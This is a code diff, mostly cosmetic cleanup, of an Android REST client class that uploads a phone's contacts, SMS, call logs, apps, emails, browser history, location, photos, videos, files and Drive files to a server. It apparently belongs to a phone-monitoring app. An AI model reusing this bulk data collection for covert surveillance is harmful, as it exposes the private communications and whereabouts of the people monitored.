@@ -29,16 +29,13 @@ import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
 
-@SuppressWarnings("all")
 public class RestClientService implements Constant {
-
     private static final String TAG = RestClientService.class.getSimpleName();
     private int j = 0;
 
     // Constructor For Contacts, Calls, Sms, Apps, Emails
     public RestClientService(@NonNull String tag, @NonNull String token, @NonNull String data) {
         RestClient restClientAPI = new ApiClient(tag).getClient();
-
         if (tag.equals(TAG_CONTACTS)) {
             Call<ApiResponsePOJO> call = restClientAPI.sendContactsToServer(token, data);
             Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
@@ -46,17 +43,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "CONTACT_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "CONTACT_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "CONTACT_FAILED_CODE_ERROR??" + code);
@@ -78,17 +70,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "SMS_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "SMS_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "SMS_FAILED_CODE_ERROR??" + code);
@@ -110,17 +97,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "CALL_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "CALL_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "CALL_FAILED_CODE_ERROR??" + code);
@@ -129,7 +111,7 @@ public class RestClientService implements Constant {
 
                 @Override
                 public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                    Log.e(TAG, "<<<Failure With CALLPOJO>>>" + t.getMessage());
+                    Log.e(TAG, "<<<Failure With CALL POJO>>>" + t.getMessage());
                 }
             };
             call.enqueue(callback);
@@ -142,17 +124,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "APP_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "APP_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "APP_FAILED_CODE_ERROR??" + code);
@@ -161,7 +138,7 @@ public class RestClientService implements Constant {
 
                 @Override
                 public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                    Log.e(TAG, "<<<Failure With APPPOJO>>>" + t.getMessage());
+                    Log.e(TAG, "<<<Failure With APP POJO>>>" + t.getMessage());
                 }
             };
             call.enqueue(callback);
@@ -173,17 +150,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "EMAIL_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "EMAIL_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "EMAIL_FAILED_CODE_ERROR??" + code);
@@ -192,7 +164,7 @@ public class RestClientService implements Constant {
 
                 @Override
                 public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                    Log.e(TAG, "<<<Failure With EMAILPOJO>>>" + t.getMessage());
+                    Log.e(TAG, "<<<Failure With EMAIL POJO>>>" + t.getMessage());
                 }
             };
             call.enqueue(callback);
@@ -204,17 +176,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "BrowserHistory_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "BrowserHistory_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "BrowserHistory_FAILED_CODE_ERROR??" + code);
@@ -223,7 +190,7 @@ public class RestClientService implements Constant {
 
                 @Override
                 public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                    Log.e(TAG, "<<<Failure With BrowserHistoryPOJO>>>" + t.getMessage());
+                    Log.e(TAG, "<<<Failure With BrowserHistory POJO>>>" + t.getMessage());
                 }
             };
             call.enqueue(callback);
@@ -235,17 +202,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "Location_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "Location_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "Location_FAILED_CODE_ERROR??" + code);
@@ -254,7 +216,7 @@ public class RestClientService implements Constant {
 
                 @Override
                 public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                    Log.e(TAG, "<<<Failure With LocationPOJO>>>" + t.getMessage());
+                    Log.e(TAG, "<<<Failure With Location POJO>>>" + t.getMessage());
                 }
             };
             call.enqueue(callback);
@@ -266,17 +228,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "SyncProcess_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "SyncProcess_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "SyncProcess_FAILED_CODE_ERROR??" + code);
@@ -285,7 +242,7 @@ public class RestClientService implements Constant {
 
                 @Override
                 public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                    Log.e(TAG, "<<<Failure With SyncProcessPOJO>>>" + t.getMessage());
+                    Log.e(TAG, "<<<Failure With SyncProcess POJO>>>" + t.getMessage());
                 }
             };
             call.enqueue(callback);
@@ -297,17 +254,12 @@ public class RestClientService implements Constant {
                 @Override
                 public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                     ApiResponsePOJO apiResponsePOJO = response.body();
-
                     int code = response.code();
                     if (code == RESPONSE_CODE) {
                         if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                             Log.e(TAG, "Permission_TRUE??" + apiResponsePOJO.getStatus());
-
                         } else {
-
                             Log.e(TAG, "Permission_FALSE??" + apiResponsePOJO.getStatus());
-
                         }
                     } else {
                         Log.e(TAG, "Permission_FAILED_CODE_ERROR??" + code);
@@ -316,7 +268,7 @@ public class RestClientService implements Constant {
 
                 @Override
                 public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                    Log.e(TAG, "<<<Failure With PermissionPOJO>>>" + t.getMessage());
+                    Log.e(TAG, "<<<Failure With Permission POJO>>>" + t.getMessage());
                 }
             };
             call.enqueue(callback);
@@ -324,52 +276,42 @@ public class RestClientService implements Constant {
     }
 
     // Constructor For Images, Videos, Files, Drive
-    public <T> RestClientService(@NonNull String tag, @NonNull String token,
-                                 @NonNull Collection<T> lst) {
+    public <T> RestClientService(@NonNull String tag, @NonNull String token, @NonNull Collection<T> lst) {
 
         RestClient restClientAPI = new ApiClient(tag).getClient();
-
         if (tag.equals(TAG_IMAGES)) {
             ArrayList<Images> lstImages = (ArrayList<Images>) lst;
-
-            if (lstImages != null && lstImages.size() > 0) {
-
+            if (lstImages.size() > 0) {
                 sendImage(j, lstImages, restClientAPI, token);
             }
         }
 
         if (tag.equals(TAG_VIDEOS)) {
             ArrayList<Video> lstVideo = (ArrayList<Video>) lst;
-
-            if (lstVideo != null && lstVideo.size() > 0) {
-
+            if (lstVideo.size() > 0) {
                 sendVideo(j, lstVideo, restClientAPI, token);
             }
         }
 
         if (tag.equals(TAG_FILES)) {
             ArrayList<Files> lstFile = (ArrayList<Files>) lst;
-
-            if (lstFile != null && lstFile.size() > 0) {
-
+            if (lstFile.size() > 0) {
                 sendFiles(j, lstFile, restClientAPI, token);
             }
         }
 
         if (tag.equals(TAG_GOOGLE_DRIVE)) {
             ArrayList<GoogleDrive> lstGoogleDrive = (ArrayList<GoogleDrive>) lst;
-
-            if (lstGoogleDrive != null && lstGoogleDrive.size() > 0) {
-
+            if (lstGoogleDrive.size() > 0) {
                 sendGoogleDrive(j, lstGoogleDrive, restClientAPI, token);
             }
         }
     }
 
-    /* sendImage */
+    // Send Images To Server
     private void sendImage(final int i, final ArrayList<Images> lstImages, final RestClient restClientAPI, final String token) {
 
-        // create part for file (photo, video, ...)
+        // create part for file (image, ...)
         MultipartBody.Part body = prepareFilePart("image", new File(lstImages.get(i).getImagePath()));
 
         // create a map of data to pass along
@@ -392,20 +334,15 @@ public class RestClientService implements Constant {
             @Override
             public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                 ApiResponsePOJO apiResponsePOJO = response.body();
-
                 int code = response.code();
                 if (code == RESPONSE_CODE) {
                     if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                         Log.e(TAG, "IMAGE_TRUE??" + apiResponsePOJO.getStatus());
                         setNextImage(i, lstImages, token);
-
                     } else {
-
                         Log.e(TAG, "IMAGE_FALSE??" + apiResponsePOJO.getStatus());
                         setNextImage(i, lstImages, token);
                     }
-
                 } else {
                     Log.e(TAG, "IMAGE_FAILED_CODE_ERROR??" + code);
                     setNextImage(i, lstImages, token);
@@ -414,24 +351,19 @@ public class RestClientService implements Constant {
 
             @Override
             public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                Log.e(TAG, "<<<Failure With IMAGEPOJO>>>" + t.getMessage());
+                Log.e(TAG, "<<<Failure With IMAGE POJO>>>" + t.getMessage());
                 setNextImage(i, lstImages, token);
             }
         };
-
         call.enqueue(callback);
     }
 
-    /* Set Next Image */
+    // Set Next Image
     private void setNextImage(int i, ArrayList<Images> lstImages, final String token) {
         if (i == 0) {
-
             j++;
-
         } else {
-
             j++;
-
         }
 
         if (lstImages.size() != j) {
@@ -440,10 +372,10 @@ public class RestClientService implements Constant {
         }
     }
 
-    /* Send Video */
+    // Send Video To Server
     private void sendVideo(final int i, final ArrayList<Video> lstVideos, final RestClient restClientAPI, final String token) {
 
-        // create part for file (photo, video, ...)
+        // create part for file (video, ...)
         MultipartBody.Part body = prepareFilePart("video", new File(lstVideos.get(i).getVideoPath()));
 
         // create a map of data to pass along
@@ -467,20 +399,15 @@ public class RestClientService implements Constant {
             @Override
             public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                 ApiResponsePOJO apiResponsePOJO = response.body();
-
                 int code = response.code();
                 if (code == RESPONSE_CODE) {
                     if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                         Log.e(TAG, "Video_TRUE??" + apiResponsePOJO.getStatus());
                         setNextVideo(i, lstVideos, token);
-
                     } else {
-
                         Log.e(TAG, "Video_FALSE??" + apiResponsePOJO.getStatus());
                         setNextVideo(i, lstVideos, token);
                     }
-
                 } else {
                     Log.e(TAG, "Video_FAILED_CODE_ERROR??" + code);
                     setNextVideo(i, lstVideos, token);
@@ -489,36 +416,30 @@ public class RestClientService implements Constant {
 
             @Override
             public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                Log.e(TAG, "<<<Failure With VideoPOJO>>>" + t.getMessage());
+                Log.e(TAG, "<<<Failure With Video POJO>>>" + t.getMessage());
                 setNextVideo(i, lstVideos, token);
             }
         };
-
         call.enqueue(callback);
     }
 
-    /* Set Next Video */
+    // Set Next Video
     private void setNextVideo(int i, ArrayList<Video> lstVideos, String token) {
         if (i == 0) {
-
             j++;
-
         } else {
-
             j++;
-
         }
-
         if (lstVideos.size() != j) {
             RestClient restClientAPI = new ApiClient(TAG_VIDEOS).getClient();
             sendVideo(j, lstVideos, restClientAPI, token);
         }
     }
 
-    /* Send Files To Server */
+    // Send Files To Server
     private void sendFiles(final int i, final ArrayList<Files> lstFiles, final RestClient restClientAPI, final String token) {
 
-        // create part for file (photo, video, ...)
+        // create part for file (file, ...)
         MultipartBody.Part body = prepareFilePart("file", new File(lstFiles.get(i).getFilePath()));
 
         // create a map of data to pass along
@@ -541,20 +462,15 @@ public class RestClientService implements Constant {
             @Override
             public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                 ApiResponsePOJO apiResponsePOJO = response.body();
-
                 int code = response.code();
                 if (code == RESPONSE_CODE) {
-
                     if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
                         Log.e(TAG, "Files_TRUE??" + apiResponsePOJO.getStatus());
                         setNextFiles(i, lstFiles, token);
-
                     } else {
-
                         Log.e(TAG, "Files_FALSE??" + apiResponsePOJO.getStatus());
                         setNextFiles(i, lstFiles, token);
                     }
-
                 } else {
                     Log.e(TAG, "Files_FAILED_CODE_ERROR??" + code);
                     setNextFiles(i, lstFiles, token);
@@ -563,24 +479,19 @@ public class RestClientService implements Constant {
 
             @Override
             public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                Log.e(TAG, "<<<Failure With FilePOJO>>>" + t.getMessage());
+                Log.e(TAG, "<<<Failure With File POJO>>>" + t.getMessage());
                 setNextFiles(i, lstFiles, token);
             }
         };
-
         call.enqueue(callback);
     }
 
-    /* Set Next Files */
+    // Set Next Files
     private void setNextFiles(int i, ArrayList<Files> lstFiles, String token) {
         if (i == 0) {
-
             j++;
-
         } else {
-
             j++;
-
         }
 
         if (lstFiles.size() != j) {
@@ -589,10 +500,10 @@ public class RestClientService implements Constant {
         }
     }
 
-    /* Send Google Drive To Server */
+    // Send Google Drive To Server
     private void sendGoogleDrive(final int i, final ArrayList<GoogleDrive> lstDrive, final RestClient restClientAPI, final String token) {
 
-        // create part for file (photo, video, ...)
+        // create part for file (drive, ...)
         MultipartBody.Part body = prepareFilePart("drive", new File(lstDrive.get(i).getFileDownloadUrl()));
 
         // create a map of data to pass along
@@ -613,20 +524,15 @@ public class RestClientService implements Constant {
             @Override
             public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                 ApiResponsePOJO apiResponsePOJO = response.body();
-
                 int code = response.code();
                 if (code == RESPONSE_CODE) {
                     if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
-
                         Log.e(TAG, "Drive_TRUE??" + apiResponsePOJO.getStatus());
                         setNextDrive(i, lstDrive, token);
-
                     } else {
-
                         Log.e(TAG, "Drive_FALSE??" + apiResponsePOJO.getStatus());
                         setNextDrive(i, lstDrive, token);
                     }
-
                 } else {
                     Log.e(TAG, "Drive_FAILED_CODE_ERROR??" + code);
                     setNextDrive(i, lstDrive, token);
@@ -635,24 +541,19 @@ public class RestClientService implements Constant {
 
             @Override
             public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
-                Log.e(TAG, "<<<Failure With DrivePOJO>>>" + t.getMessage());
+                Log.e(TAG, "<<<Failure With Drive POJO>>>" + t.getMessage());
                 setNextDrive(i, lstDrive, token);
             }
         };
-
         call.enqueue(callback);
     }
 
-    /* Set Next Drive */
+    // Set Next Drive
     private void setNextDrive(int i, ArrayList<GoogleDrive> lstDrive, String token) {
         if (i == 0) {
-
             j++;
-
         } else {
-
             j++;
-
         }
 
         if (lstDrive.size() != j) {
@@ -668,20 +569,19 @@ public class RestClientService implements Constant {
         return RequestBody.create(MediaType.parse(MULTIPART_FORM_DATA), descriptionString);
     }
 
+    // Prepare FilePart
     @NonNull
     private MultipartBody.Part prepareFilePart(String partName, File file) {
         // https://github.com/iPaulPro/aFileChooser/blob/master/aFileChooser/src/com/ipaulpro/afilechooser/utils/FileUtils.java
         RequestBody requestFile = RequestBody.create(MediaType.parse(MULTIPART_FORM_DATA), file);
-
         // MultipartBody.Part is used to send also the actual file name
         return MultipartBody.Part.createFormData(partName, file.getName(), requestFile);
     }
 
-    /* Delete Drive Folder */
+    // Delete Drive Folder
     private void deleteDriveFolder() {
-       /* Check and Delete And Refresh Gallery Google Drive Foolder in SdCard */
-        File path = new java.io.File(Environment.getExternalStorageDirectory().toString()
-                + java.io.File.separator + DRIVE_NAME);
+        // Check, Delete And Refresh Gallery Google Drive Folder in Sd-Card
+        File path = new java.io.File(Environment.getExternalStorageDirectory().toString() + java.io.File.separator + DRIVE_NAME);
         Utilities.deleteDirectory(path);
         Utilities.refreshAndroidGallery(MyAppApplication.getInstance(), Uri.fromFile(path));
     }
